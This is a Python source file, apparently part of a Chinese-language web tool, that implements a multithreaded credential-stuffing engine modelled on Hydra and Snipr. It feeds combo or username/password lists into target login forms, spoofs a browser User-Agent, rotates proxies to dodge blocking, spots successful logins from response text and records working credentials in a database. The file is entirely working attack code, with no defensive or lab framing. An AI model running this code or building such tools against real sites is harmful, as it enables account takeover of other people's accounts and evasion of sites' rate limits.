#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
攻击引擎核心模块
基于Hydra、Snipr等工具的设计理念实现
"""

import threading
import time
import requests
import random
from datetime import datetime, timedelta
from concurrent.futures import ThreadPoolExecutor, as_completed
from models.database import db
from models.attack import Attack
from models.result import AttackResult
from models.target import Target
from models.proxy import Proxy
from core.proxy_manager import ProxyManager
import json
import logging

logger = logging.getLogger(__name__)

class AttackEngine:
    """撞库攻击引擎"""
    
    def __init__(self, attack_id):
        self.attack_id = attack_id
        self.attack = None
        self.target = None
        self.proxy_manager = ProxyManager()
        self.is_running = False
        self.is_paused = False
        self.start_time = None
        self.session = requests.Session()
        
        # 统计信息
        self.total_attempts = 0
        self.successful_attempts = 0
        self.failed_attempts = 0
        self.response_times = []
        
        self._load_attack_data()
    
    def _load_attack_data(self):
        """加载攻击任务数据"""
        try:
            self.attack = Attack.query.get(self.attack_id)
            if not self.attack:
                raise Exception(f"攻击任务 {self.attack_id} 不存在")
            
            self.target = Target.query.get(self.attack.target_id)
            if not self.target:
                raise Exception(f"目标站点 {self.attack.target_id} 不存在")
            
            logger.info(f"加载攻击任务: {self.attack.name} -> {self.target.name}")
            
        except Exception as e:
            logger.error(f"加载攻击数据失败: {e}")
            raise
    
    def _prepare_credentials(self):
        """准备凭据列表"""
        credentials = []
        
        if self.attack.wordlist_type == 'combo':
            # 组合字典格式: username:password
            combo_data = self.attack.combo_list or ""
            for line in combo_data.strip().split('\n'):
                if ':' in line:
                    username, password = line.strip().split(':', 1)
                    credentials.append((username, password))
        
        elif self.attack.wordlist_type == 'separate':
            # 分离字典
            usernames = (self.attack.username_list or "").strip().split('\n')
            passwords = (self.attack.password_list or "").strip().split('\n')
            
            # 笛卡尔积组合
            for username in usernames:
                for password in passwords:
                    if username and password:
                        credentials.append((username.strip(), password.strip()))
        
        logger.info(f"准备了 {len(credentials)} 个凭据组合")
        return credentials
    
    def _build_request_data(self, username, password):
        """构建请求数据"""
        try:
            # 基础表单数据
            data = {
                self.target.username_field: username,
                self.target.password_field: password
            }
            
            # 添加额外字段
            if self.target.additional_fields:
                additional = json.loads(self.target.additional_fields)
                data.update(additional)
            
            return data
            
        except Exception as e:
            logger.error(f"构建请求数据失败: {e}")
            return None
    
    def _build_headers(self):
        """构建请求头"""
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
        }
        
        try:
            if self.target.headers:
                custom_headers = json.loads(self.target.headers)
                headers.update(custom_headers)
        except:
            pass
        
        return headers
    
    def _attempt_login(self, username, password, proxy=None):
        """尝试登录"""
        try:
            start_time = time.time()
            
            # 构建请求
            url = self.target.login_url or self.target.url
            data = self._build_request_data(username, password)
            headers = self._build_headers()
            
            if not data:
                return self._create_result(username, password, False, error="构建请求数据失败")
            
            # 配置代理
            proxies = None
            if proxy and self.attack.use_proxy:
                proxies = {
                    'http': proxy.proxy_url,
                    'https': proxy.proxy_url
                }
            
            # 发送请求
            response = requests.request(
                method=self.target.method,
                url=url,
                data=data,
                headers=headers,
                proxies=proxies,
                timeout=self.attack.timeout,
                allow_redirects=True
            )
            
            response_time = time.time() - start_time
            self.response_times.append(response_time)
            
            # 判断登录是否成功
            is_success = self._check_login_success(response)
            
            # 创建结果记录
            result = self._create_result(
                username=username,
                password=password,
                is_success=is_success,
                status_code=response.status_code,
                response_time=response_time,
                response_size=len(response.content),
                request_url=url,
                request_method=self.target.method,
                proxy_used=proxy.proxy_url if proxy else None,
                response_content=response.text[:1000]  # 只保存前1000字符
            )
            
            # 更新代理统计
            if proxy:
                if is_success:
                    proxy.success_count += 1
                else:
                    proxy.failure_count += 1
                proxy.last_used = datetime.utcnow()
                proxy.response_time = response_time
            
            return result
            
        except requests.exceptions.Timeout:
            return self._create_result(username, password, False, error="请求超时")
        except requests.exceptions.ConnectionError:
            return self._create_result(username, password, False, error="连接错误")
        except Exception as e:
            return self._create_result(username, password, False, error=str(e))
    
    def _check_login_success(self, response):
        """检查登录是否成功"""
        try:
            content = response.text.lower()
            
            # 检查成功标识符
            if self.target.success_indicators:
                success_indicators = json.loads(self.target.success_indicators)
                for indicator in success_indicators:
                    if indicator.lower() in content:
                        return True
            
            # 检查失败标识符
            if self.target.failure_indicators:
                failure_indicators = json.loads(self.target.failure_indicators)
                for indicator in failure_indicators:
                    if indicator.lower() in content:
                        return False
            
            # 默认基于状态码判断
            return response.status_code == 200
            
        except Exception as e:
            logger.error(f"检查登录状态失败: {e}")
            return False
    
    def _create_result(self, username, password, is_success, **kwargs):
        """创建结果记录"""
        return {
            'attack_id': self.attack_id,
            'username': username,
            'password': password,
            'is_success': is_success,
            'status_code': kwargs.get('status_code'),
            'response_time': kwargs.get('response_time'),
            'response_size': kwargs.get('response_size'),
            'request_url': kwargs.get('request_url'),
            'request_method': kwargs.get('request_method'),
            'proxy_used': kwargs.get('proxy_used'),
            'response_content': kwargs.get('response_content'),
            'error_message': kwargs.get('error')
        }
    
    def _save_result(self, result_data):
        """保存结果到数据库"""
        try:
            result = AttackResult(**result_data)
            db.session.add(result)
            db.session.commit()
            
            # 更新统计
            if result_data['is_success']:
                self.successful_attempts += 1
            else:
                self.failed_attempts += 1
                
        except Exception as e:
            logger.error(f"保存结果失败: {e}")
            db.session.rollback()
    
    def _update_progress(self):
        """更新攻击进度"""
        try:
            progress = (self.total_attempts / len(self.credentials)) * 100 if hasattr(self, 'credentials') else 0
            success_rate = (self.successful_attempts / self.total_attempts) * 100 if self.total_attempts > 0 else 0
            avg_response_time = sum(self.response_times) / len(self.response_times) if self.response_times else 0
            
            # 更新数据库
            self.attack.progress = min(progress, 100)
            self.attack.total_attempts = self.total_attempts
            self.attack.successful_attempts = self.successful_attempts
            self.attack.failed_attempts = self.failed_attempts
            self.attack.success_rate = success_rate
            self.attack.average_response_time = avg_response_time
            
            # 估算完成时间
            if self.total_attempts > 0 and avg_response_time > 0:
                remaining = len(self.credentials) - self.total_attempts
                estimated_time = remaining * avg_response_time / self.attack.threads
                self.attack.estimated_completion = datetime.utcnow() + timedelta(seconds=estimated_time)
            
            db.session.commit()
            
        except Exception as e:
            logger.error(f"更新进度失败: {e}")
            db.session.rollback()
    
    def start(self):
        """开始攻击"""
        try:
            self.is_running = True
            self.start_time = datetime.utcnow()
            
            # 准备凭据
            self.credentials = self._prepare_credentials()
            if not self.credentials:
                raise Exception("没有可用的凭据")
            
            logger.info(f"开始攻击，共 {len(self.credentials)} 个凭据，{self.attack.threads} 个线程")
            
            # 更新状态
            self.attack.status = 'running'
            self.attack.started_at = self.start_time
            db.session.commit()
            
            # 使用线程池执行攻击
            with ThreadPoolExecutor(max_workers=self.attack.threads) as executor:
                futures = []
                
                for username, password in self.credentials:
                    if not self.is_running:
                        break
                    
                    # 获取代理
                    proxy = None
                    if self.attack.use_proxy:
                        proxy = self.proxy_manager.get_proxy()
                    
                    future = executor.submit(self._attempt_login, username, password, proxy)
                    futures.append(future)
                    
                    # 控制请求频率
                    if self.attack.delay > 0:
                        time.sleep(self.attack.delay)
                
                # 处理结果
                for future in as_completed(futures):
                    if not self.is_running:
                        break
                    
                    try:
                        result = future.result()
                        self._save_result(result)
                        self.total_attempts += 1
                        
                        # 定期更新进度
                        if self.total_attempts % 10 == 0:
                            self._update_progress()
                            
                    except Exception as e:
                        logger.error(f"处理结果失败: {e}")
            
            # 完成攻击
            self.attack.status = 'completed' if self.is_running else 'stopped'
            self.attack.completed_at = datetime.utcnow()
            self.attack.progress = 100
            self._update_progress()
            
            logger.info(f"攻击完成，成功: {self.successful_attempts}, 失败: {self.failed_attempts}")
            
        except Exception as e:
            logger.error(f"攻击执行失败: {e}")
            self.attack.status = 'failed'
            db.session.commit()
            raise
        finally:
            self.is_running = False
    
    def stop(self):
        """停止攻击"""
        self.is_running = False
        logger.info(f"攻击任务 {self.attack_id} 已停止")
    
    def pause(self):
        """暂停攻击"""
        self.is_paused = True
        logger.info(f"攻击任务 {self.attack_id} 已暂停")
    
    def resume(self):
        """恢复攻击"""
        self.is_paused = False
        logger.info(f"攻击任务 {self.attack_id} 已恢复")